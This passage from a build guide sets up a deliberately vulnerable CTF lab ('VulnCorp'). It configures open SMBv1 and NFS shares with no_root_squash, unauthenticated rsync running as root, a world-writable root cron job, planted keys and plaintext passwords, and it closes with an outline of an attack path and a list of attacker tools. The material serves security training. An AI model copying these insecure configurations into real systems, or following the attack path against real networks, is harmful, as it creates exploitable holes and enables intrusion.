sudo tee /srv/shares/IT_Share/README.txt << 'EOF'
VulnCorp IT Share
=================
For access issues, contact helpdesk@vulncorp.local

Password policy: Corp@<Year>! format (e.g., Corp@Admin2024)
EOF

# Leaked SSH keys
sudo ssh-keygen -t rsa -b 2048 -f /srv/shares/SSH_Keys/dc01_admin_rsa -N "" -C "admin@vulncorp-dc01"
sudo ssh-keygen -t rsa -b 2048 -f /srv/shares/SSH_Keys/backup_rsa -N "" -C "backupadmin@backup01"

# Plant flags
echo "VULN{smb_sh4r3_0p3n}" | sudo tee /srv/shares/IT_Share/flag.txt
echo "VULN{nfs_pii_3xp0s3d}" | sudo tee /srv/shares/HR/flag.txt
```

### 13.4 Configure Samba (SMBv1 + Open Shares — intentional)

```bash
sudo tee /etc/samba/smb.conf << 'EOF'
[global]
   workgroup = VULNCORP
   server string = VulnCorp File Server
   security = user

   # SMBv1 ENABLED — intentional EternalBlue vulnerability
   server min protocol = NT1
   server max protocol = SMB3

   # No SMB signing (NTLM relay possible)
   server signing = disabled

   log file = /var/log/samba/log.%m
   max log size = 1000

   # Null session enumeration allowed
   map to guest = Bad User
   guest account = nobody

[IT_Share]
   path = /srv/shares/IT_Share
   comment = IT Department Share
   # Everyone Full Control — intentional vulnerability!
   browseable = yes
   writable = yes
   guest ok = yes
   create mask = 0777
   directory mask = 0777
   force user = nobody

[HR]
   path = /srv/shares/HR
   comment = Human Resources
   browseable = yes
   writable = yes
   guest ok = yes
   create mask = 0777

[SSH_Keys]
   path = /srv/shares/SSH_Keys
   comment = SSH Key Backup
   browseable = yes
   guest ok = yes

[backup_scripts]
   path = /srv/shares/backup_scripts
   comment = Backup Scripts
   browseable = yes
   guest ok = yes
EOF
```

### 13.5 Configure NFS (no_root_squash — intentional critical vuln)

```bash
sudo mkdir -p /exports/backup /exports/HR
sudo cp -r /srv/shares/backup_scripts /exports/backup/
sudo cp -r /srv/shares/HR/* /exports/HR/
sudo chmod -R 777 /exports/

sudo tee /etc/exports << 'EOF'
# no_root_squash — intentional vulnerability
# Allows a root user mounting this share to have root access!
/exports/backup    *(rw,sync,no_root_squash,no_subtree_check)
/exports/HR        *(rw,sync,no_root_squash,no_subtree_check)
EOF

sudo exportfs -ra
```

### 13.6 Plant Flags

```bash
echo "VULN{nfs_n0_r00t_squ4sh}" | sudo tee /exports/backup/flag.txt
echo "VULN{f1l3_s3rv3r_r00t3d_m4ch1n3_10}" | sudo tee /root/root.txt
```

### 13.7 Enable All Services

```bash
sudo systemctl enable smbd nmbd nfs-kernel-server ssh
sudo systemctl start smbd nmbd nfs-kernel-server ssh
```

### 13.8 Test

```bash
smbclient -L \\192.168.1.40 -N             # List shares anonymously
smbclient \\192.168.1.40\IT_Share -N       # Access IT_Share without creds
# get flag.txt

showmount -e 192.168.1.40
sudo mount -t nfs 192.168.1.40:/exports/backup /mnt/
ls /mnt/
```

---

## 14. Machine 11 — int-backup01 (Backup Server)

**OS:** Debian 13 | **IP:** 192.168.1.50 | **Zone:** Internal
**VirtualBox:** RAM 1024 MB · vCPUs 1 · Disk 20 GB · Adapter 1: `vboxnet2`

**Goal:** Rsync daemon with no auth exposing full system backups including /etc/shadow equivalents and plaintext DB credentials.

### 14.1 Set Static IP

```
address 192.168.1.50
netmask 255.255.255.0
gateway 192.168.1.1
```

### 14.2 Install Services

```bash
sudo apt update
sudo apt install -y rsync openssh-server curl wget net-tools sudo cron vim

sudo useradd -m backupadmin && echo "backupadmin:backup123" | sudo chpasswd
sudo usermod -aG sudo backupadmin
```

### 14.3 Create Fake Backups (Contain Sensitive Data)

```bash
sudo mkdir -p /backups/{full-backup,db-backup,config-backup}

# Simulate /etc/shadow from DC — use real hashes so attackers can crack them
python3 -c "import crypt; print('Administrator:' + crypt.crypt('Corp@Admin2024', crypt.mksalt(crypt.METHOD_SHA512)))" | \
  sudo tee /backups/full-backup/etc_shadow_dc01.txt

echo "john.doe:$(python3 -c \"import crypt; print(crypt.crypt('Corp@Admin2024', crypt.mksalt(crypt.METHOD_SHA512)))\")" | \
  sudo tee -a /backups/full-backup/etc_shadow_dc01.txt

# Database backup with plaintext credentials
sudo tee /backups/db-backup/mysql_backup.sql << 'EOF'
-- VulnCorp MySQL Full Backup — Generated: 2026-09-01 02:00:01

CREATE DATABASE vulncorp_prod;
USE vulncorp_prod;

CREATE TABLE internal_credentials (
  id INT, service VARCHAR(50), host VARCHAR(50),
  username VARCHAR(50), password VARCHAR(100)
);

INSERT INTO internal_credentials VALUES
(1,'SSH','192.168.1.10','Administrator','Corp@Admin2024'),
(2,'RDP','192.168.1.10','john.doe','Corp@Admin2024'),
(3,'MSSQL','192.168.1.20','sa','sa'),
(4,'SMB','192.168.1.40','fileuser','File@User2024'),
(5,'SSH','192.168.1.50','backupadmin','backup123');
EOF

# Config backup with rsyncd credentials
sudo tee /backups/config-backup/rsyncd.secrets << 'EOF'
backupadmin:backup123
EOF

# Plant flags
echo "VULN{rsync_c0nf_cr3ds}" | sudo tee -a /backups/config-backup/rsyncd.secrets
echo "VULN{rsync_full_b4ckup}" | sudo tee /backups/full-backup/flag.txt
echo "VULN{b4ckup_sh4d0w_g0ld}" | sudo tee /backups/full-backup/shadow_flag.txt
```

### 14.4 Configure rsyncd (No Auth — intentional critical vuln)

```bash
sudo tee /etc/rsyncd.conf << 'EOF'
# rsyncd configuration
# NO AUTHENTICATION — intentional critical vulnerability

uid = root
gid = root
use chroot = no
max connections = 4
log file = /var/log/rsyncd.log
pid file = /var/run/rsyncd.pid

[full-backup]
    path = /backups/full-backup
    comment = Full System Backups (ALL SERVERS)
    read only = no
    list = yes

[db-backup]
    path = /backups/db-backup
    comment = Database Backups (with plaintext passwords)
    read only = no
    list = yes

[config-backup]
    path = /backups/config-backup
    comment = Configuration Files (rsyncd secrets included)
    read only = no
    list = yes
EOF
```

### 14.5 Writable Cron for Privesc (intentional)

```bash
sudo mkdir -p /opt/backup
echo '#!/bin/bash' | sudo tee /opt/backup/run.sh
sudo chmod 777 /opt/backup/run.sh
echo "* * * * * root /opt/backup/run.sh" | sudo tee /etc/cron.d/backup-job
```

### 14.6 Create Systemd Service for rsyncd

```bash
sudo tee /etc/systemd/system/rsyncd.service << 'EOF'
[Unit]
Description=rsync daemon (no auth — intentional)
After=network.target

[Service]
ExecStart=/usr/bin/rsync --daemon --no-detach --config=/etc/rsyncd.conf
Restart=always

[Install]
WantedBy=multi-user.target
EOF

sudo systemctl daemon-reload
sudo systemctl enable rsyncd ssh cron
sudo systemctl start rsyncd
echo "VULN{rsync_n04uth_dump}" | sudo tee /backups/flag.txt
echo "VULN{b4ckup_s3rv3r_r00t3d_m4ch1n3_11}" | sudo tee /root/root.txt
```

### 14.7 Test

```bash
rsync rsync://192.168.1.50/                     # List modules (no auth required)
rsync rsync://192.168.1.50/full-backup/ /tmp/   # Download everything!
rsync rsync://192.168.1.50/db-backup/ /tmp/     # Get DB dumps with passwords
```

---

## 15. Inter-Zone Routing

The 3 VirtualBox Host-Only networks are isolated from each other by default.
To allow attackers to pivot between zones, choose one of these options:

### Option A — Kali Attacker VM with Multiple Adapters (Recommended)

Add your **Kali Linux attacker VM** to all 3 networks:
- Adapter 1: `vboxnet0` (DMZ)
- Adapter 2: `vboxnet1` (Restricted)
- Adapter 3: `vboxnet2` (Internal)

On Kali, enable IP forwarding and add routes:
```bash
sudo sysctl -w net.ipv4.ip_forward=1
# Kali can now reach all 3 zones directly
```

### Option B — Tiny Alpine Router VM

Create one small Alpine Linux VM (256 MB RAM, 3 adapters — one per vboxnet).

```bash
# On Alpine router VM — enable IP forwarding
echo "net.ipv4.ip_forward = 1" >> /etc/sysctl.conf
sysctl -p
# Alpine routes between all 3 interfaces automatically
```

### Option C — Static Routes on Each VM

Add routes on individual VMs when you need cross-zone access:
```bash
# On a DMZ VM — to reach Restricted
sudo ip route add 172.16.0.0/24 via 10.10.10.1

# On a Restricted VM — to reach Internal
sudo ip route add 192.168.1.0/24 via 172.16.0.1
```

---

## 16. CTFd Scoreboard Setup

Run CTFd on your Windows host machine or a spare VM using Docker Desktop:

```bash
mkdir ctfd && cd ctfd

cat > docker-compose.yml << 'EOF'
version: "3.8"
services:
  ctfd:
    image: ctfd/ctfd:latest
    container_name: ctfd
    restart: always
    ports:
      - "8888:8000"
    environment:
      - DATABASE_URL=mysql+pymysql://ctfd:ctfd@db/ctfd
      - REDIS_URL=redis://cache:6379
      - SECRET_KEY=ctfd_vulncorp_secret
    volumes:
      - ctfd_data:/var/uploads
    depends_on:
      - db
      - cache

  db:
    image: mariadb:10.4.12
    container_name: ctfd-db
    restart: always
    environment:
      - MYSQL_ROOT_PASSWORD=ctfdrootpass
      - MYSQL_USER=ctfd
      - MYSQL_PASSWORD=ctfd
      - MYSQL_DATABASE=ctfd

  cache:
    image: redis:4
    container_name: ctfd-cache
    restart: always

volumes:
  ctfd_data:
EOF

docker compose up -d
# Access CTFd at http://localhost:8888
# First-time setup: create admin account, then add all flags from masterplan.md
```

---

## 17. Firewall Rules

Apply these iptables rules on each Linux VM to enforce zone isolation.
Run the appropriate block on each machine:

### On DMZ VMs (10.10.10.x)

```bash
# Allow established connections
sudo iptables -A FORWARD -m state --state ESTABLISHED,RELATED -j ACCEPT

# DMZ → Restricted: allow only SSH and MySQL
sudo iptables -A FORWARD -s 10.10.10.0/24 -d 172.16.0.0/24 -p tcp --dport 22 -j ACCEPT
sudo iptables -A FORWARD -s 10.10.10.0/24 -d 172.16.0.0/24 -p tcp --dport 3306 -j ACCEPT
sudo iptables -A FORWARD -s 10.10.10.0/24 -d 172.16.0.0/24 -j DROP

# DMZ → Internal: BLOCK everything
sudo iptables -A FORWARD -s 10.10.10.0/24 -d 192.168.1.0/24 -j DROP

# Save rules
sudo iptables-save | sudo tee /etc/iptables/rules.v4
```

### On Restricted VMs (172.16.x.x)

```bash
# Restricted → Internal: allow only admin ports
sudo iptables -A FORWARD -s 172.16.0.0/24 -d 192.168.1.0/24 -p tcp --dport 22 -j ACCEPT
sudo iptables -A FORWARD -s 172.16.0.0/24 -d 192.168.1.0/24 -p tcp --dport 445 -j ACCEPT
sudo iptables -A FORWARD -s 172.16.0.0/24 -d 192.168.1.0/24 -p udp --dport 161 -j ACCEPT
sudo iptables -A FORWARD -s 172.16.0.0/24 -d 192.168.1.0/24 -j DROP

sudo iptables-save | sudo tee /etc/iptables/rules.v4
```

---

## 18. Testing Your Lab

### 18.1 Full Lab Health Check (run from Kali)

```bash
#!/bin/bash
echo "=== VulnCorp Lab Health Check ==="

# DMZ Zone
curl -s http://10.10.10.10 > /dev/null && echo "[+] dmz-web01 HTTP: OK" || echo "[-] dmz-web01 HTTP: FAIL"
nc -z 10.10.10.20 25 && echo "[+] dmz-mail01 SMTP: OK" || echo "[-] dmz-mail01 SMTP: FAIL"
nc -z 10.10.10.30 21 && echo "[+] dmz-ftp01 FTP: OK" || echo "[-] dmz-ftp01 FTP: FAIL"

# Restricted Zone
mysql -h 172.16.0.10 -u root -ptoor -e "SELECT 1" > /dev/null 2>&1 && echo "[+] rz-db01 MySQL: OK" || echo "[-] rz-db01 MySQL: FAIL"
redis-cli -h 172.16.0.10 ping > /dev/null && echo "[+] rz-db01 Redis: OK" || echo "[-] rz-db01 Redis: FAIL"
curl -s http://172.16.0.20:8443 > /dev/null && echo "[+] rz-vpn01 Web: OK" || echo "[-] rz-vpn01 Web: FAIL"
curl -s -u nagiosadmin:nagios http://172.16.0.30/nagios4/ > /dev/null && echo "[+] rz-monitor01 Nagios: OK" || echo "[-] rz-monitor01 Nagios: FAIL"

# Internal Zone
curl -s http://192.168.1.20 > /dev/null && echo "[+] int-erp01 HTTP: OK" || echo "[-] int-erp01 HTTP: FAIL"
curl -s http://192.168.1.30:2375/version > /dev/null && echo "[+] int-dev01 Docker API: OK (VULN ACTIVE)" || echo "[-] int-dev01 Docker API: FAIL"
smbclient -L \\192.168.1.40 -N > /dev/null 2>&1 && echo "[+] int-files01 SMB: OK" || echo "[-] int-files01 SMB: FAIL"
rsync rsync://192.168.1.50/ > /dev/null 2>&1 && echo "[+] int-backup01 Rsync: OK" || echo "[-] int-backup01 Rsync: FAIL"

# Windows Machines (from Windows host or after pivot)
# nc -z 192.168.1.10 445 && echo "[+] int-dc01 SMB: OK" || echo "[-] int-dc01 SMB: FAIL"
# nc -z 192.168.1.10 3389 && echo "[+] int-dc01 RDP: OK" || echo "[-] int-dc01 RDP: FAIL"
# nc -z 192.168.1.60 445 && echo "[+] int-ws01 SMB: OK" || echo "[-] int-ws01 SMB: FAIL"
# nc -z 192.168.1.60 3389 && echo "[+] int-ws01 RDP: OK" || echo "[-] int-ws01 RDP: FAIL"
# nmap --script smb-vuln-ms17-010 192.168.1.60    # EternalBlue check on WS01

echo "=== Health Check Complete ==="
```

### 18.2 Suggested Attack Path

```
1. Start at http://10.10.10.10 (dmz-web01)
   → Exploit SQLi → Command Injection → Root
   → Find credentials in DB

2. Pivot to 10.10.10.30 (dmz-ftp01)
   → Anonymous FTP → Download backup_rsa + network_map.txt

3. Pivot to 172.16.0.10 (rz-db01) using harvested creds
   → MySQL root/toor → Dump PII + internal_credentials table
   → Redis no-auth → RCE via cron

4. Pivot to 172.16.0.30 (rz-monitor01)
   → SNMP walk → Full topology revealed
   → Nagios admin/nagios → Plugin dir writable → RCE

5. Pivot to 172.16.0.20 (rz-vpn01)
   → Web admin admin/admin → Download VPN configs
   → Log file reveals domain credentials

6. Enter Internal Zone
   → 192.168.1.50 rsync no-auth → Download backups → Crack hashes
   → 192.168.1.30 Docker API unauthenticated → Container escape → Host root
   → 192.168.1.40 EternalBlue (SMBv1) → SYSTEM

7. 192.168.1.20 (int-erp01)
   → IDOR → Access all employee records
   → SSRF → Pivot to internal services
   → SQLi → DB access

8. 192.168.1.10 (int-dc01) — FINAL BOSS
   → AS-REP Roast svc_backup → Crack → DCSync → Domain Admin
   → 🏆 VULN{d0m41n_4dm1n_3mp1r3_f3ll}
```

---

## 🛠️ Tools You Need on Kali Linux (Attacker VM)

```bash
sudo apt install -y \
  nmap metasploit-framework hydra john hashcat \
  smbclient smbmap impacket-scripts \
  bloodhound neo4j gobuster ffuf nikto sqlmap \
  netcat-traditional chisel proxychains4 \
  evil-winrm crackmapexec responder \
  enum4linux snmp snmpwalk redis-tools mysql-client

# Python AD attack tools
pip3 install impacket bloodhound

echo "[+] Attack toolkit ready"
```

---

*End of Build Guide — VulnCorp Enterprise Testbed*
*Reference: masterplan.md for full vulnerability details and flag list.*
